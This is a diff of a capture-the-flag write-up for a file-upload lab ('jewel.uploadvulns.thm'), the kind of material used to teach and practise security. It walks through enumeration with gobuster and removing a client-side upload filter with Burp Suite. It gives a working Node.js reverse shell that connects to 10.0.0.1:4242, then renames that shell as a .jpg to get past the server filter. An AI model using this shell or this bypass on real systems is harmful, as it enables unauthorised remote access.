@@ -10,6 +10,8 @@ Take what you've learned in this room and use it to get a shell on this machine.
 
 ## The Solution
 ### Enumeration
+Visiting the website `jewel.uploadvulns.thm`, one can easily infer that the website accepts `jpg/jpeg` images, functionally for jewels, to showcase through the website. Somehow, we need to exploit this file upload vulnerability.
+
 In CTFs like this one, it is imperative to gather as much information as possible on the target. As we were first introduced in the room to enumerate via `gobuster`, we will do exactly that.
 ```console
 root@ip-10-10-241-182:~# gobuster dir -u jewel.uploadvulns.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64
@@ -36,8 +38,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 /Admin (Status: 200)
 Progress: 9029 / 220561 (4.09%)
 ```
-We look at the website and see how it responds to each of these directories. It seems only `http://jewel.uploadvulns.thm/admin` is interesting. 
-----insert image maybe??
+Looking at the admin page, we see that we are able to execute code through it by choosing files in the `/modules` directory. From this, one can recognize that this is a potential directory-traversal vulnerability. 
 
 Looking at the page source is another method of enumeration. The following lines are interesting. 
 ```html
@@ -71,6 +72,27 @@ $(document).ready(function(){let errorTimeout;const fadeSpeed=1000;function setR
 			}
 const text={success:"File successfully uploaded",failure:"No file selected",invalid:"Invalid file type"};$.ajax("/",{data:JSON.stringify({name:fileBox.name,type:fileBox.type,file:event.target.result}),contentType:"application/json",type:"POST",success:function(data){let colour="";switch(data){case "success":colour="green";break;case "failure":case "invalid":colour="red";break}setResponseMsg(text[data],colour)}})}})});
 ```
-Great! It seems like the JavaScript code filters by means of (1) File Extension, (2) Magic Number, and (3) File size. Googling what the magic numbers are for jpeg files, we obtain the following hex values: `FF D8 FF`.  
+In addition, one can find a reference to the background image of the website of the form `/content/XXX.jpg`. It is reasonable to think that the images are uploaded are stored there.
+
+Great! It seems like the JavaScript code filters by means of (1) File Extension, (2) Magic Number, and (3) File size. Since I am able to access this filtering, the script is a client-side filter which can be removed through `Burp Suite` via interception of responses. We do exactly this.
+
+![Burp Suite Interception](/Images/Task11_uploadvulns_0)
+
+Interesting, the header `X-Powered-By: Express` suggests that the server uses `Node.js` for its back-end programming language. This allows us to search online for a reverse shell code for `Node.js`. The reverse shell code used is from [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#nodejs)
+```js
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(4242, "10.0.0.1", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application from crashing
+})();
+```
+Now that the client-side filter is removed, we can try to upload our Node.js reverse shell. One can quickly see that the file is not accepted suggesting that there are server-side filters in place. Editing our reverse shell to have the name `reverse-shell.jpg` and uploading it however leads to an acceptance. Awesome!
 
 
